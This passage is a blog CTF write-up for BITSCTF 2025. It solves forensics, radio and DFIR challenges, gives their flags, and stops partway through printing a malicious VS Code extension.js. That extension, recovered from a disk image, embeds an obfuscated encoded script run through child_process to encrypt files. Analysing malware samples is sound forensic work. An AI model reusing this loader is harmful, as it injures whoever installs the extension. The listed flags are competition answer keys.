<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>BITSCTF-2025 | W01f</title><meta name="author" content="Ansh Aggarwal"><meta name="copyright" content="Ansh Aggarwal"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="I participated in BITSCTF 2025, organized by Bitskrieg. Here are the Writeups of some Forensics, RF and DFIR challenges I was personally able to solve during the competition. ForensicsFinders KeepersC">
<meta property="og:type" content="article">
<meta property="og:title" content="BITSCTF-2025">
<meta property="og:url" content="http://w1r3w01f.github.io/2025/02/09/BITSCTF-2025/index.html">
<meta property="og:site_name" content="W01f">
<meta property="og:description" content="I participated in BITSCTF 2025, organized by Bitskrieg. Here are the Writeups of some Forensics, RF and DFIR challenges I was personally able to solve during the competition. ForensicsFinders KeepersC">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://w1r3w01f.github.io/images/bits_logo.png">
<meta property="article:published_time" content="2025-02-08T18:30:00.000Z">
<meta property="article:modified_time" content="2025-02-15T11:22:56.081Z">
<meta property="article:author" content="Ansh Aggarwal">
<meta property="article:tag" content="Forensics">
<meta property="article:tag" content="Steganography">
<meta property="article:tag" content="File Analysis">
<meta property="article:tag" content="DFIR">
<meta property="article:tag" content="RF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://w1r3w01f.github.io/images/bits_logo.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "BITSCTF-2025",
  "url": "http://w1r3w01f.github.io/2025/02/09/BITSCTF-2025/",
  "image": "http://w1r3w01f.github.io/images/bits_logo.png",
  "datePublished": "2025-02-08T18:30:00.000Z",
  "dateModified": "2025-02-15T11:22:56.081Z",
  "author": [
    {
      "@type": "Person",
      "name": "Ansh Aggarwal",
      "url": "http://w1r3w01f.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://w1r3w01f.github.io/2025/02/09/BITSCTF-2025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'BITSCTF-2025',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/pfp.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/about"><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/bits_logo.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">W01f</span></a><a class="nav-page-title" href="/"><span class="site-name">BITSCTF-2025</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/about"><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">BITSCTF-2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-02-08T18:30:00.000Z" title="Created 2025-02-09 00:00:00">2025-02-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-02-15T11:22:56.081Z" title="Updated 2025-02-15 16:52:56">2025-02-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-Writeups/">CTF-Writeups</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>I participated in BITSCTF 2025, organized by Bitskrieg. Here are the Writeups of some Forensics, RF and DFIR challenges I was personally able to solve during the competition.</p>
<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Finders-Keepers"><a href="#Finders-Keepers" class="headerlink" title="Finders Keepers"></a>Finders Keepers</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>Another simple steganography challenge where we are initially given a .png file.</p>
<h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>The given png has a .jpeg and a .wav file embedded in itself which we can find by the hex analysis and then extract the file using byte scraping to get the following two files.</p>
<p><a href="/./files/extracted_at_0x12005.jpg">Image</a><br><a href="/./files/extracted_at_0x645f0.wav">Audio</a></p>
<p>The audio file on opening in audacity immediately shows the profile of a morse code so we use this online tool (<a target="_blank" rel="noopener" href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">https://morsecode.world/international/decoder/audio-decoder-adaptive.html</a>) to decode the morse code and get its message as <code>snooooooppppppp</code>, which happens to be the steghide passphrase for the extracted jpeg file and it gives us our flag.</p>
<p><img src="/./images/audacity.png" alt="Audacity"></p>
<p>Flag: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;1_4m_5l33py_1256AE76&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="AutoBots-Unite"><a href="#AutoBots-Unite" class="headerlink" title="AutoBots Unite!"></a>AutoBots Unite!</h3><h4 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a chall.dwg file with following description: “Mr. Douglas Adams is so sick and tired of old people using the same encryption methods again and again.”</p>
<h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>Inital searches reveal that a .dwg file is a 2D or 3D drawing created with Autodesk AutoCAD so we can open the file in AutoDesk Online here (<a target="_blank" rel="noopener" href="https://viewer.autodesk.com/designviews">https://viewer.autodesk.com/designviews</a>). On opening the file here we get a really absurd looking image of some sort of barcode.</p>
<p><img src="/./images/chall.dwg.png" alt="Chall.dwg"></p>
<p>Initially I tried various different approaches of finding some differences in the lines color shades or the inter-line distances but at the end it turned out that the flag was embedded in the lengths of the lines. All lines had lengths of type 42.xxx or 43.xxx so if we do <code>round((length-42)*100)</code> we get ASCII codes which on decoding initially gives some garbish but eventually reveals our flag.</p>
<p>Flag: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;b4rc0d3s_4r3_0v3r4t3d_4sf_h3h3_0k1md0n3&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Symphonies"><a href="#Symphonies" class="headerlink" title="Symphonies"></a>Symphonies</h3><h4 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are presented with a midi file (though corrupted) and our target is to decode its message.</p>
<h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p>Inital searches reveal that a .midi file varies from MP3 or WAV files as it is not a waveform. This means that it inherently produces no audio signal. MIDI files contain messages that communicate to software instruments (or connected hardware gear) what to play. These messages include:</p>
<pre><code>Note-on/off: Note on signifies the start of a specific keyboard note; note-off signifies the end of a note.
Velocity value: High values lead to a louder volume for that note as well as possible articulation differences; low values lead to lower volumes for the note.
Pitch bend: Controls pitch alterations up or down a semitone (often linked to pitch bend wheels).
</code></pre>
<p><img src="/./images/midi_hex.png" alt="Original Hex"></p>
<p>Initially the magic bytes of the given file are corrupted which we can quickly fix to the correct bytes <code>4D 54 68 64</code> to fix the .midi file which we can now load in (<a target="_blank" rel="noopener" href="https://signal.vercel.app/edit">https://signal.vercel.app/edit</a>) for its visualisation.</p>
<p><img src="/./images/midi.png" alt="Midi file"></p>
<p>Immediately what catches our eye is all the velocities lie below 127 so these may represent an ASCII code so we write the following code to get and decode both the file’s velocites and the notes which then because are 2 strings of similar lengths we try to XOR them as our first option and that just happends to be the correct solution to get our flag.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mido</span><br><span class="line"></span><br><span class="line">midi = mido.MidiFile(<span class="string">&#x27;Demo2.midi&#x27;</span>)</span><br><span class="line">velocities = <span class="string">&#x27;&#x27;</span></span><br><span class="line">notes=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> msg <span class="keyword">in</span> midi:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> msg.is_meta <span class="keyword">and</span> msg.<span class="built_in">type</span> == <span class="string">&#x27;note_on&#x27;</span>:</span><br><span class="line">        velocities = velocities + <span class="built_in">chr</span>(msg.velocity)</span><br><span class="line">        notes = notes + <span class="built_in">chr</span>(msg.note)</span><br><span class="line"></span><br><span class="line">notes = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,notes.split()))</span><br><span class="line">notes = notes[:<span class="built_in">len</span>(velocities)]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(a ^ <span class="built_in">ord</span>(b)) <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(notes, velocities))</span><br><span class="line"><span class="built_in">print</span>(result.encode())</span><br></pre></td></tr></table></figure>

<p>Flag: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;y0u_7h0u6h7_y0u_c0uld_6u355_7h15?!_qrtd434&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Hardware-RF"><a href="#Hardware-RF" class="headerlink" title="Hardware&#x2F;RF"></a>Hardware&#x2F;RF</h2><h3 id="ulation"><a href="#ulation" class="headerlink" title="%ulation"></a>%ulation</h3><h4 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a complex signal file in this challenge and the name obviously hint to some sort of modulation of the signal is involved.</p>
<h4 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h4><p>Fairly straight forward challenge where all we had to do was open the file in Universal Radio Hacker (<a target="_blank" rel="noopener" href="https://github.com/jopohl/urh">https://github.com/jopohl/urh</a>) and it does all the job for us and immediately spit out the flag.</p>
<p><img src="/./images/modulation_urh.png" alt="Given Signal"></p>
<p>Flag: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;A_br13f_4nd_g3ntl3_1ntr0duc710n_70_r4di0_h4ck1ng_c5c33558&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Old-Skool"><a href="#Old-Skool" class="headerlink" title="Old Skool"></a>Old Skool</h3><h4 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a .iq file with the following description:<br>“I remember my father talking about those old age radios and how they work. Pretty cool if you ask me. Also he told me about a radio channel which had a frequency between 1500-1599khz from PHILIPPINES.</p>
<p>Note: Sampling Rate for the file is 24kHz”</p>
<h4 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h4><p>We are given a .iq file, which are standard RF signal files wherein the Sampling rate of given file being 24 khz and the freq range of the radio channel used to transmit being of range 1500-1599 kHz immediately tells its a challenge of Frequency Modulation or downsampling. Now being an ECE student I decided to do signal analysis using MATLAB just to be old school and justify the challenge name.</p>
<p>The process I followed was to first read the iq and interpret it as complex signals that they are <code>I+jQ</code> where I is the In-phase component and Q is the Quadrature-phase component. Then perform signal mixing to make it baseband and remove the DC components. Finally add a band-pass (butterworth) filter on top.</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">clc; clear; close all;</span><br><span class="line">filename = <span class="string">&#x27;\modulated.iq&#x27;</span>;</span><br><span class="line">fs = <span class="number">24000</span>;</span><br><span class="line"></span><br><span class="line">fid = fopen(filename, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">raw_data = fread(fid, <span class="string">&#x27;float32&#x27;</span>); </span><br><span class="line"></span><br><span class="line">iq_data = <span class="built_in">complex</span>(raw_data(<span class="number">1</span>:<span class="number">2</span>:<span class="keyword">end</span>), raw_data(<span class="number">2</span>:<span class="number">2</span>:<span class="keyword">end</span>));</span><br><span class="line">t = (<span class="number">0</span>:<span class="built_in">length</span>(iq_data)<span class="number">-1</span>) / fs;</span><br><span class="line">f_station = <span class="number">1566000</span>;</span><br><span class="line">shifted_signal = iq_data .* <span class="built_in">exp</span>(<span class="number">-1</span><span class="built_in">j</span> * <span class="number">2</span> * <span class="built_in">pi</span> * f_station * t.&#x27;);</span><br><span class="line"></span><br><span class="line">am_signal = <span class="built_in">abs</span>(shifted_signal);</span><br><span class="line">am_signal = am_signal - <span class="built_in">mean</span>(am_signal);</span><br><span class="line">am_signal = am_signal / <span class="built_in">max</span>(<span class="built_in">abs</span>(am_signal));</span><br><span class="line"></span><br><span class="line">fc = <span class="number">5000</span>;</span><br><span class="line">[b, a] = butter(<span class="number">5</span>, fc/(fs/<span class="number">2</span>));</span><br><span class="line">filtered_audio = filter(b, a, am_signal);</span><br><span class="line"></span><br><span class="line">audiowrite(<span class="string">&#x27;radio_audio.wav&#x27;</span>, filtered_audio, fs);</span><br><span class="line">sound(filtered_audio, fs);</span><br></pre></td></tr></table></figure>

<p><a href="/./files/radio_audio.wav">Extracted Audio</a></p>
<p>Flag: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;welcome_to_our_radio_enjoy_our_song_collection&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="DFIR"><a href="#DFIR" class="headerlink" title="DFIR"></a>DFIR</h2><h3 id="ViruS-Camp-1"><a href="#ViruS-Camp-1" class="headerlink" title="ViruS Camp 1"></a>ViruS Camp 1</h3><h4 id="Challenge-Description-5"><a href="#Challenge-Description-5" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given an artifact file dimp.ad1 and the description says to decode the encrypted flag file.</p>
<h4 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h4><p>On initial analysis of the given artifacts file in FTK Imager we find a peculiar file <code>extension.js</code> which appears to be the malware in question responsible for flag encryption. So the challenge was basically around a malicious extension of VS-Code which encrypted the user’s flag image which was to be decoded. Given below is the <code>extension.js</code>.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> __createBinding = (<span class="variable language_">this</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">__createBinding</span>) || (<span class="title class_">Object</span>.<span class="property">create</span> ? (<span class="keyword">function</span>(<span class="params">o, m, k, k2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (k2 === <span class="literal">undefined</span>) k2 = k;</span><br><span class="line">    <span class="keyword">var</span> desc = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(m, k);</span><br><span class="line">    <span class="keyword">if</span> (!desc || (<span class="string">&quot;get&quot;</span> <span class="keyword">in</span> desc ? !m.<span class="property">__esModule</span> : desc.<span class="property">writable</span> || desc.<span class="property">configurable</span>)) &#123;</span><br><span class="line">      desc = &#123; <span class="attr">enumerable</span>: <span class="literal">true</span>, <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="keyword">return</span> m[k]; &#125; &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(o, k2, desc);</span><br><span class="line">&#125;) : (<span class="keyword">function</span>(<span class="params">o, m, k, k2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (k2 === <span class="literal">undefined</span>) k2 = k;</span><br><span class="line">    o[k2] = m[k];</span><br><span class="line">&#125;));</span><br><span class="line"><span class="keyword">var</span> __setModuleDefault = (<span class="variable language_">this</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">__setModuleDefault</span>) || (<span class="title class_">Object</span>.<span class="property">create</span> ? (<span class="keyword">function</span>(<span class="params">o, v</span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(o, <span class="string">&quot;default&quot;</span>, &#123; <span class="attr">enumerable</span>: <span class="literal">true</span>, <span class="attr">value</span>: v &#125;);</span><br><span class="line">&#125;) : <span class="keyword">function</span>(<span class="params">o, v</span>) &#123;</span><br><span class="line">    o[<span class="string">&quot;default&quot;</span>] = v;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> __importStar = (<span class="variable language_">this</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">__importStar</span>) || (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ownKeys = <span class="keyword">function</span>(<span class="params">o</span>) &#123;</span><br><span class="line">        ownKeys = <span class="title class_">Object</span>.<span class="property">getOwnPropertyNames</span> || <span class="keyword">function</span> (<span class="params">o</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> ar = [];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> o) <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(o, k)) ar[ar.<span class="property">length</span>] = k;</span><br><span class="line">            <span class="keyword">return</span> ar;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">ownKeys</span>(o);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">mod</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mod &amp;&amp; mod.<span class="property">__esModule</span>) <span class="keyword">return</span> mod;</span><br><span class="line">        <span class="keyword">var</span> result = &#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (mod != <span class="literal">null</span>) <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="title function_">ownKeys</span>(mod), i = <span class="number">0</span>; i &lt; k.<span class="property">length</span>; i++) <span class="keyword">if</span> (k[i] !== <span class="string">&quot;default&quot;</span>) <span class="title function_">__createBinding</span>(result, mod, k[i]);</span><br><span class="line">        <span class="title function_">__setModuleDefault</span>(result, mod);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="built_in">exports</span>, <span class="string">&quot;__esModule&quot;</span>, &#123; <span class="attr">value</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">activate</span> = activate;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">deactivate</span> = deactivate;</span><br><span class="line"><span class="keyword">const</span> vscode = <span class="title function_">__importStar</span>(<span class="built_in">require</span>(<span class="string">&quot;vscode&quot;</span>));</span><br><span class="line"><span class="keyword">const</span> child_process_1 = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="title function_">__importStar</span>(<span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>));</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">activate</span>(<span class="params">context</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> command = vscode.<span class="property">commands</span>.<span class="title function_">registerCommand</span>(<span class="string">&quot;rs&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> scriptContent = <span class="string">`$wy7qIGPnm36HpvjrL2TMUaRbz = &quot;K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ&quot; 